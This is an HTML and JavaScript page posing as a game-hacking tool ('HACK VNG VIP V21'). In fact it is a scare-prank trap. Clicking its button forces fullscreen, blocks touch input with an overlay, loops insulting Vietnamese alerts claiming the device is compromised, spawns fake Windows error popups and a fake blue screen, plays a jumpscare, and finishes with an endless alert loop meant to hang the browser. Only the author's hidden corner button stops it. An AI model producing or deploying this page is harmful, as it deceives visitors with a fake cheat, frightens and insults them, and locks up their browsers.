<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>⚡ VNG SYSTEM BYPASS V21 ⚡</title>
    <style>
        body { background: #000; margin: 0; overflow: hidden; touch-action: none; font-family: sans-serif; }
        
        /* LỚP PHỦ KHÓA 100% */
        #overlay {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100vw; height: 100vh;
            z-index: 999999;
            background: rgba(0,0,0,0.01);
            touch-action: none !important;
        }

        /* NÚT THOÁT CHO BRO (Góc trên bên trái) */
        #secret-exit {
            position: fixed;
            top: 0; left: 0;
            width: 40px; height: 40px;
            z-index: 1000001;
            background: transparent;
        }

        #ui { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: #0f0; }
        .btn { background: #111; color: #f00; border: 2px solid #f00; padding: 20px 40px; font-weight: bold; font-size: 25px; cursor: pointer; position: relative; z-index: 10; }

        .win-popup {
            position: absolute; width: 260px; background: #f0f0f0; border: 1px solid #005a9e;
            z-index: 1000; color: black; pointer-events: none;
        }
        .win-header { background: #0078d7; color: white; padding: 5px; font-size: 10px; }
        .win-body { padding: 10px; font-size: 12px; display: flex; align-items: center; }
        .win-icon { background: #e81123; color: white; border-radius: 50%; width: 20px; height: 20px; display: flex; align-items: center; justify-content: center; margin-right: 10px; }

        #bsod { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0078d7; color: white; padding: 50px 25px; z-index: 9999; }
        #jumpscare { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000000; }
        #jumpscare img { width: 100%; height: 100%; object-fit: contain; }
        
        .shake { animation: shake 0.05s infinite; }
        @keyframes shake { 0%{transform:translate(8px,8px)} 50%{transform:translate(-8px,-8px)} 100%{transform:translate(8px,-8px)} }
    </style>
</head>
<body>

<div id="overlay"></div>
<div id="secret-exit" onclick="stopAll();"></div>

<div id="ui">
    <h1>HACK VNG VIP V21</h1>
    <button class="btn" onclick="startTrap()">ACTIVATE INJECT</button>
</div>

<div id="bsod">
    <div style="font-size: 80px;">:(</div>
    <h2>System Error...</h2>
    <p id="progress">Loading (0%)</p>
</div>

<div id="jumpscare">
    <img src="virus.jpeg">
</div>

<audio id="s-err" src="https://www.myinstants.com/media/sounds/windows-xp-error.mp3"></audio>
<audio id="s-start" src="https://www.myinstants.com/media/sounds/windows-xp-startup.mp3"></audio>
<audio id="s-scary" src="scary1.mp3" loop></audio>

<script>
let isTrapped = true;

function stopAll() {
    isTrapped = false;
    document.getElementById('overlay').style.display = 'none';
    alert("Exit mode ON - Bro can swipe now.");
}

function startTrap() {
    isTrapped = true;
    document.getElementById('overlay').style.display = 'block';
    
    if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();

    // 1. KHÓA VUỐT NGAY LẬP TỨC BẰNG VÒNG LẶP ALERT
    // Dùng setTimeout để không làm treo hoàn toàn trình duyệt ngay lập tức
    let alertCount = 0;
    function lockNav() {
        if (!isTrapped) return;
        alert("THẰNG NGU! MÁY MÀY ĐÃ BỊ XÂM NHẬP!");
        alertCount++;
        if (alertCount < 5) { // Chửi 5 lần rồi mới cho chạy hiệu ứng Windows
            setTimeout(lockNav, 50);
        } else {
            runWindowsSpam();
        }
    }
    lockNav();
}

function runWindowsSpam() {
    let count = 0;
    let timer = setInterval(() => {
        if (!isTrapped) { clearInterval(timer); return; }
        spawnWindows();
        document.getElementById('s-err').cloneNode(true).play();
        count++;
        if (count > 20) {
            clearInterval(timer);
            setTimeout(showBSOD, 500);
        }
    }, 120);
}

function spawnWindows() {
    let d = document.createElement('div');
    d.className = 'win-popup';
    d.style.left = Math.random() * 40 + '%';
    d.style.top = Math.random() * 60 + '%';
    d.innerHTML = `<div class="win-header">System</div><div class="win-body"><div class="win-icon">X</div>Fatal Error: 0x666</div>`;
    document.body.appendChild(d);
}

function showBSOD() {
    if (!isTrapped) return;
    document.getElementById('ui').style.display = 'none';
    document.querySelectorAll('.win-popup').forEach(e => e.remove());
    document.getElementById('bsod').style.display = 'block';
    document.getElementById('s-start').play();

    let p = 0;
    let intv = setInterval(() => {
        if (!isTrapped) { clearInterval(intv); return; }
        p++;
        document.getElementById('progress').innerHTML = `Loading (${p}%)`;
        if (p >= 100) {
            clearInterval(intv);
            goFinal();
        }
    }, 300);
}

function goFinal() {
    if (!isTrapped) return;
    document.getElementById('bsod').style.backgroundColor = "#900";
    document.getElementById('s-scary').play();

    setTimeout(() => {
        if (!isTrapped) return;
        document.getElementById('jumpscare').style.display = 'block';
        document.body.classList.add('shake');
        
        // 2. VÒNG LẶP ALERT VÔ TẬN - KHÓA CHẾT LẦN CUỐI
        while(isTrapped) {
            alert("MÁY MÀY ĐÃ NÁT! THẰNG NGU!");
        }
    }, 5000);
}
</script>
</body>
</html>
